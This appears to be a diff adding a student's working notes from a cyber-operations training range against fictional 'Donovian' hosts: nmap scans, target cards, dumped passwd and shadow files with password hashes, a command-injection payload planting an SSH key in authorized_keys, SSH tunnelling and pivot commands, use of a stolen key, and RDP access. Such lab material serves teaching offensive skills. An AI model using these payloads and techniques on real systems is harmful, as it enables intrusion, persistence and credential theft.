@@ -1,0 +1,428 @@
+Day 1
+
+Nmap scan report for 192.168.28.97
+Host is up (0.00048s latency).
+All 1000 scanned ports on 192.168.28.97 are closed
+
+Nmap scan report for 192.168.28.98
+Host is up (0.00058s latency).
+Not shown: 999 closed ports
+PORT   STATE SERVICE
+53/tcp open  domain
+
+Nmap scan report for 192.168.28.100
+Host is up (0.00066s latency).
+Not shown: 998 closed ports
+PORT     STATE SERVICE
+80/tcp   open  http
+2222/tcp open  EtherNetIP-1
+
+Nmap scan report for 192.168.28.105
+Host is up (0.00060s latency).
+Not shown: 997 closed ports
+PORT     STATE SERVICE
+21/tcp   open  ftp
+23/tcp   open  telnet
+2222/tcp open  EtherNetIP-1
+
+Nmap scan report for 192.168.28.111
+Host is up (0.00057s latency).
+Not shown: 997 closed ports
+PORT     STATE SERVICE
+80/tcp   open  http
+2222/tcp open  EtherNetIP-1
+8080/tcp open  http-proxy
+
+Nmap scan report for 192.168.28.120
+Host is up (0.00058s latency).
+Not shown: 999 closed ports
+PORT     STATE SERVICE
+4242/tcp open  vrml-multi-use
+
+Nmap done: 6 IP addresses (6 hosts up) scanned in 4.20 seconds
+
+
+
+
+
+
+
+
+
+
+Scheme of Maneuver:
+>Jump Box
+->T1:10.100.28.40
+-->T2: ???
+
+Target Section:
+
+T1
+Hostname: Donovian_MI_websvr
+IP: 10.100.28.40
+OS: unknown
+Creds:unknown
+Last Known SSH Port: unknown
+PSP: Unknown
+Malware: Unknown
+Action: Conduct approved Web Exploitation techniques to collect intellegence.
+
+T1
+Hostname: Donovian_Training_Websvr
+IP: ???
+OS: unknown
+Creds:unknown
+Last Known SSH Port: unknown
+PSP: Unknown
+Malware: Unknown
+Action: Conduct approved Web Exploitation techniques to collect intellegence.
+
+
+Nmap scan report for 10.100.28.40
+Host is up (0.00066s latency).
+Not shown: 998 closed ports
+PORT     STATE SERVICE
+80/tcp   open  http
+| http-enum: 
+|   /robots.txt: Robots file
+|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+|_  /uploads/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+4444/tcp open  krb524
+
+Nmap done: 1 IP address (1 host up) scanned in 1.45 seconds
+
+
+
+
+
+
+
+
+root:x:0:0:root:/root:/bin/bash 
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
+bin:x:2:2:bin:/bin:/usr/sbin/nologin 
+sys:x:3:3:sys:/dev:/usr/sbin/nologin 
+sync:x:4:65534:sync:/bin:/bin/sync 
+games:x:5:60:games:/usr/games:/usr/sbin/nologin 
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin 
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin 
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin 
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin 
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin 
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin 
+www-data:x:33:33:www-data:/var/www:/bin/bash 
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin 
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin 
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin 
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin 
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin 
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin 
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin 
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin 
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin 
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin 
+lxd:x:105:65534::/var/lib/lxd/:/bin/false 
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin 
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin 
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin 
+sshd:x:109:65534::/run/sshd:/usr/sbin/nologin 
+pollinate:x:110:1::/var/cache/pollinate:/bin/false 
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash 
+mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false 
+billybob:x:1001:1001:you found me SpCSnAAfdT02V3JauHpE:/home/billybob:/bin/bash 
+billybob:x:1001:1001:you found me SpCSnAAfdT02V3JauHpE:/home/billybob:/bin/bash
+
+; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCpyjnA/YQUIHdKyoenlE5xCZyhbydcc9cpmtZGVA/PBWtGgUjS6FKpXptg5JuRI6calHlPSNUERh9dkzPSjDvKSNujaAIrHoB6HdZp6OxJk7pnexbjzH1+96EXBc7MweAdC4pEbPlH5sj013Zs9ryILlhp5/yvTjjk5BYeNU4e/HJ01EmBpkLXQvqnoLK7a3rTugKUSPdoGf+2AHcSNQ7iQb8IHQdFMgTq/LLtG8B7NYivhAUgcoCVgfKYIkIeg4/Fb1EbAhvX29B4sWwM7OCyDStYOTKuEdFx2DV5E4crMS0RP+K5MQmM8iQMDX9QXjI9JRYzGwokQD0Ng7QYjSPd student@lin-ops" > /home/billybob/.ssh/authorized_keys
+
+ssh -S /tmp/jump dummy -O forward -L1111:10.100.28.40:80 -L2222:10.100.28.48:80 -L3333:10.100.28.40:4444 -L4444:10.100.28.48:4444
+
+
+
+
+
+Target Section:
+
+T1
+Hostname: donovian-nla
+IP: 10.100.28.48
+OS: unknown
+Creds:unknown
+Last Known SSH Port: unknown
+Last Known HTTP Port: 80
+PSP: Unknown
+Malware: Unknown
+Action: Conduct approved SQLi Exploitation techniques to collect intelligence.
+
+
+
+
+
+
+
+
+
+
+
+
+T1
+Hostname: web.site.donovia
+IP: 192.168.28.111
+OS: unknown
+Creds: comrade::StudentWebExploitPassword
+Last Known SSH Port: unknown
+PSP: Unknown
+Malware: Unknown
+Action: Extract approved binaries under directory titled "longTermStorage".
+
+
+
+
+
+
+
+
+
+
+Scheme of Maneuver:
+>Jump Box
+->T1: 192.168.28.111
+->T2: 192.168.28.105
+
+>Jump Box
+->donovian_grey_host
+-->T3: 192.168.150.245
+
+Target Section:
+
+T1
+Hostname: Donovian_Webserver
+IP: 192.168.28.111
+OS: CentOS
+Creds: comrade :: StudentWebExploitPassword
+Last Known SSH Port: 2222
+Action: Exploit binary.
+
+T2
+Hostname: Donovian-Terminal
+IP: 192.168.28.105
+OS: unknown
+Creds: comrade :: StudentReconPassword
+Last Known SSH Port: 2222
+
+T3
+Hostname: unknown
+IP: 192.168.150.245
+OS: unknown
+Creds:unknown
+Last Known SSH Port: unknown
+PSP: Unknown
+Malware: Unknown
+Action: Exploit a network service on the machine
+
+
+
+
+
+
+
+
+T1
+Hostname: Donovian_Extranet
+IP: 192.168.28.100
+OS: CentOS
+Creds:Unknown
+Last Known SSH Port: 2222
+PSP: none
+Malware: none
+Action: Perform SSH masquerade and survey system. Identify redirection to the next target.
+
+T2
+Hostname: Donovian_Intranet
+IP: X.X.X.X
+OS: Ubuntu
+Creds:Unknown
+Last Known SSH Port: X
+PSP: none
+Malware: none
+Action: Perform SSH masquerade and survey system. Identify redirection to the next target.
+
+T3
+Hostname: Donovian_Internal
+IP: x.x.x.9
+OS: unknown
+Creds:unknown
+Last Known SSH Port: unknown
+PSP: Unknown
+Malware: Unknown
+Action: Gain access; survey host and map Donovian internal Cyberspace.
+
+comrade pub key on extranet
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDgP2uXYcb+W40AxfGwjsfFlA6jR1/zL711bXQAjvAuEv5L6tNVkdDyNNdD66Q8Jwsh8DzLPDqeOTmQr7FDMAO5sCD7z+R+kEpvoVzBsgKXL22l2ipxGtCxJzhI1HT16fYB1BZPqmZpJylBdym3KN0yZvgFMs7B0jb9SFkh/+Jp1OxzohX88Xc2j+Dk1URkY0xZOTvOgYafFjbFINaeuVMqb+YeEyj9jxxNFo69F4selrftFmaf5AupSiW+P8GjOReArWBxEgvcLqshl+gTuf817jxb2terzW8f/qVK09XsepMPPZ5elfUqSzK1N3a4sTu1+0EsGALGjB/iSXbeCmcD comrade@extranet.site.donovia
+
+
+
+
+
+scp stolenkey student@10.50.32.116:/home/student
+proxychains ssh -i /home/student/stolenkey comrade@192.168.150.253 -p 3201
+comrade::StudentMidwayPassword
+ssh -S /tmp/t2 dummy -O forward -L3333:192.168.28.9:5985
+ssh -S /tmp/t2 dummy -O forward -L4444:192.168.28.9:47001
+ssh -S /tmp/t2 dummy -O forward -L5555:192.168.28.9:3389
+xfreerdp /v:127.0.0.1:5555 /u:comrade /glyph-cache /dynamic-resolution /clipboard
+
+
+
+
+Scheme of Maneuver:
+>Jump Box
+->Pivot: 192.168.28.105
+-->T1: 192.168.28.5
+
+Target Section:
+
+Pivot
+Hostname: ftp.site.donovia
+IP: 192.168.28.105
+OS: Ubuntu 18.04
+Creds: comrade :: StudentReconPassword
+Last Known SSH Port: 2222
+Malware: none
+Action: Perform SSH masquerade and redirect to the next target. No survey required, cohabitation with known PSP approved.
+
+T1
+Hostname: donovian-windows-private
+IP: 192.168.28.5
+OS: Windows ver: Unknown
+Creds: comrade :: StudentPrivPassword
+Last Known Ports: 3389
+PSP: unknown
+Malware: unknown
+Action: Test supplied credentials, if possible gain access to host. Conduct host survey and gain privileged access.
+
+
+
+ssh -S /tmp/jump dummy -O forward -L1111:192.168.28.105:2222
+ssh -S /tmp/t1 dummy -O forward -L2222:192.168.28.5:3389
+
+
+
+
+
+
+Scheme of Maneuver:
+>Jump Box
+->Pivot:192.168.28.105
+--->T1: 192.168.28.27
+--->T2: 192.168.28.12
+
+Target Section:
+
+Pivot
+Hostname: Donovian-Terminal
+IP: 192.168.28.105
+OS: Ubuntu 18.04
+Creds: comrade :: StudentReconPassword
+Last Known SSH Port: 2222
+PSP: rkhunter
+Malware: none
+Action: Perform SSH masquerade and redirect to the next target. No survey required, cohabitation with known PSP approved.
+
+T1
+Hostname: lin2
+IP: 192.168.28.27
+OS: Linux ver: Unknown
+Creds: comrade :: StudentPrivPassword
+Last Known Ports: unknown
+PSP: unknown
+Malware: unknown
+Action: Test supplied credentials, if possible gain access to host. Conduct host survey and gain privileged access.
+
+T2
+Hostname: lin1
+IP: 192.168.28.12
+OS: Linux ver: Unknown
+Creds: comrade :: StudentPrivPassword
+Last Known Ports: unknown
+PSP: unknown
+Malware: unknown
+Action: Test supplied credentials, if possible gain access to host. Conduct host survey and gain privileged access.
+
+
+
+
+T1 /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+zeus:x:0:0:zeus:/root:/bin/bash
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+comrade:x:1001:1001::/home/comrade:/bin/bash
+billybob:x:1002:1002::/home/billybob:/bin/bash
+bobby:x:1003:1003::/home/bobby:/bin/bash
+jerry:x:1004:1004::/home/jerry:/bin/bash
+jimmy:x:1005:1005::/home/jimmy:/bin/bash
+sarah:x:1006:1006::/home/sarah:/bin/bash
+wendy:x:1007:1007::/home/wendy:/bin/bash
+
+
+
+
+T2 /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+zeus:x:0:0:zeus:/root:/bin/bash
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+comrade:x:1001:1001::/home/comrade:/bin/bash
+billybob:x:1002:1002::/home/billybob:/bin/bash
+bobby:x:1003:1003::/home/bobby:/bin/bash
+jerry:x:1004:1004::/home/jerry:/bin/bash
+jimmy:x:1005:1005::/home/jimmy:/bin/bash
+sarah:x:1006:1006::/home/sarah:/bin/bash
+wendy:x:1007:1007::/home/wendy:/bin/bash
+
+
+cat /home/billybob/f!@g1.txt > /tmp/flag.txt
+
+
+
+root:$6$/3RL8PUH$VdeUuKr75jSALs9jmLTGKMzxkZvhsRzmPsiCYM9cg.AODP1YgA.JWajSkknNxI0ptS/pK8PIOXMaXcvd3IgRT.:18934:0:99999:7:::
+zeus:$6$V34Nv7Ib$.PZChAQgzH9FMTfoUN0X3Y2mUIT3/rXju7cmXa2mAVTAZscB48slP8A333kYxrtlPzMLN9yEd5wZnQJe4Wzbz/:18934:0:99999:7:::      ghjcnbnenrf
+daemon:*:18325:0:99999:7:::
+bin:*:18325:0:99999:7:::
+sys:*:18325:0:99999:7:::
+sync:*:18325:0:99999:7:::
+games:*:18325:0:99999:7:::
+man:*:18325:0:99999:7:::
+lp:*:18325:0:99999:7:::
+mail:*:18325:0:99999:7:::
+news:*:18325:0:99999:7:::
+uucp:*:18325:0:99999:7:::
+proxy:*:18325:0:99999:7:::
+www-data:*:18325:0:99999:7:::
+backup:*:18325:0:99999:7:::
+list:*:18325:0:99999:7:::
+irc:*:18325:0:99999:7:::
+gnats:*:18325:0:99999:7:::
+nobody:*:18325:0:99999:7:::
+systemd-network:*:18325:0:99999:7:::
+systemd-resolve:*:18325:0:99999:7:::
+syslog:*:18325:0:99999:7:::
+messagebus:*:18325:0:99999:7:::
+_apt:*:18325:0:99999:7:::
+lxd:*:18325:0:99999:7:::
+uuidd:*:18325:0:99999:7:::
+dnsmasq:*:18325:0:99999:7:::
+landscape:*:18325:0:99999:7:::
+sshd:*:18325:0:99999:7:::
+pollinate:*:18325:0:99999:7:::
+ubuntu:!:18934:0:99999:7:::
+comrade:$6$EabwO.sc$zT1xo.vDKK209IDOiZjDIXoc8YGU2ljT/LEE8i.pG0bO1xvHMTsZQKGkBAuDqZ4r7Xk4dNJzIVFe6VdzLt8PT0:18934:0:99999:7:::
+billybob:$6$je9YkJOP$Jdu6dFuwkqS3Qg5xT.2dq9elEU9b0.ybTaXwIYFnqn9g/k0h.n1PtUOROf28gVVxNzYJ4z8.uw7ve9BTD7t611:18934:0:99999:7:::
+bobby:$6$ryRQEt/S$lTxP9YSMV4NllvVwpHyw4I.sgl7a4htNeKgzHeGNyhXKLtLgTBF2rYd9y.fcO3cgA2cBL8RrwRIL1yrwSPbM7.:18934:0:99999:7:::
+jerry:$6$YMWB7T6W$7f2Nx71Tt4eNDBuBeo6H.kjs93nIRD1j924GWZ.s/Xp5FNgo3JzJowgOhQ.8LkHcYFNuY1l4m3EJ5Br0FQMiU0:18934:0:99999:7:::
+jimmy:$6$h5lL6ckI$cL.Oei4ZvvG2iyiaD2HK09MVFpa0NGUZkVF5FSewC42NlNt2//I/FrzA0o3LXGZRlGck004K1i08CWpnkLj2l1:18934:0:99999:7:::
+sarah:$6$CBpHvShR$1CIKzlI9glGDyBDzoisnOBBvWBYAjlmGeqOPLrncAxFh6Ylvda3o31amBxtiU/L3XgjoZVCFjhW1.cv40MHwm/:18934:0:99999:7:::
+wendy:$6$p596ZHHF$Tse1FrfiLQQaAxxqlZpbYe9c3n6qZbzQmiGcuCFv8IwcvqC0v8422.mw4mR.dBKMQTNbq5/sj/c9VIV3JncNB0:18934:0:99999:7:::
+
+
+
+
